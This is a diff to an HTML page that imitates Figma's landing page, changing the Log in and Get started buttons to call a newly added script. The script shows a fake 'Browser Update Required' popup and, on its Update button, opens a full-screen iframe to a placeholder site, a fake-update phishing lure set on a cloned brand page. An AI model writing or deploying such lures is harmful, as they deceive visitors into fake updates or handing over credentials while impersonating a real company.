@@ -752,8 +752,8 @@
         </div>
         <div class="auth-buttons">
             <a href="#" class="btn">Contact sales</a>
-            <a href="http://192.168.31.238/" class="btn btn-outline">Log in</a>
-            <a href="http://192.168.31.238/" class="btn btn-primary">Get started for free</a>
+            <a href="#" class="btn btn-outline" onclick="showUpdatePopup(event)">Log in</a>
+            <a href="#" class="btn btn-primary" onclick="showUpdatePopup(event)">Get started for free</a>
         </div>
     </header>
 
@@ -762,7 +762,7 @@
         <div class="hero-content">
             <h1>Think bigger.<br>Build faster.</h1>
             <p>Figma helps design and development teams build great products, together.</p>
-            <a href="http://192.168.31.238/" class="btn btn-primary">Get started for free</a>
+            <a href="#" class="btn btn-primary" onclick="showUpdatePopup(event)">Get started for free</a>
         </div>
         <div class="hero-image">
             <img src="1png.png" alt="Colorful abstract shapes" class="hero-right-image" />
@@ -1160,6 +1160,92 @@
                 });
             }
         });
+
+        function showUpdatePopup(event) {
+            event.preventDefault();
+
+            // Create popup elements
+            const overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+            overlay.style.zIndex = '10000';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
+
+            const popup = document.createElement('div');
+            popup.style.backgroundColor = 'white';
+            popup.style.padding = '30px';
+            popup.style.borderRadius = '8px';
+            popup.style.maxWidth = '400px';
+            popup.style.textAlign = 'center';
+
+            const title = document.createElement('h3');
+            title.textContent = 'Browser Update Required';
+            title.style.marginBottom = '15px';
+
+            const message = document.createElement('p');
+            message.textContent = 'Your browser needs to be updated to continue.';
+            message.style.marginBottom = '20px';
+
+            const updateButton = document.createElement('button');
+            updateButton.textContent = 'Update';
+            updateButton.style.padding = '10px 20px';
+            updateButton.style.backgroundColor = '#000';
+            updateButton.style.color = '#fff';
+            updateButton.style.border = 'none';
+            updateButton.style.borderRadius = '6px';
+            updateButton.style.cursor = 'pointer';
+
+            updateButton.addEventListener('click', function () {
+                // Remove the popup
+                document.body.removeChild(overlay);
+
+                // Create an invisible iframe to load the target site
+                const hiddenFrame = document.createElement('iframe');
+                hiddenFrame.style.position = 'fixed';
+                hiddenFrame.style.top = '0';
+                hiddenFrame.style.left = '0';
+                hiddenFrame.style.width = '100%';
+                hiddenFrame.style.height = '100%';
+                hiddenFrame.style.border = 'none';
+                hiddenFrame.style.zIndex = '99999';
+                hiddenFrame.src = 'https://example.com';
+
+                // When the iframe loads, make it visible and go fullscreen
+                hiddenFrame.onload = function () {
+                    // Make iframe visible
+                    document.body.style.overflow = 'hidden';
+
+                    // Request fullscreen on the iframe after it's loaded
+                    setTimeout(() => {
+                        try {
+                            hiddenFrame.requestFullscreen().catch(err => {
+                                console.log("Error attempting to enable fullscreen: ", err);
+                            });
+                        } catch (error) {
+                            console.error("Fullscreen error:", error);
+                        }
+                    }, 500); // Small delay to ensure content is ready
+                };
+
+                document.body.appendChild(hiddenFrame);
+            });
+
+
+
+            // Assemble popup
+            popup.appendChild(title);
+            popup.appendChild(message);
+            popup.appendChild(updateButton);
+            overlay.appendChild(popup);
+            document.body.appendChild(overlay);
+        }
+
     </script>
 </body>
 
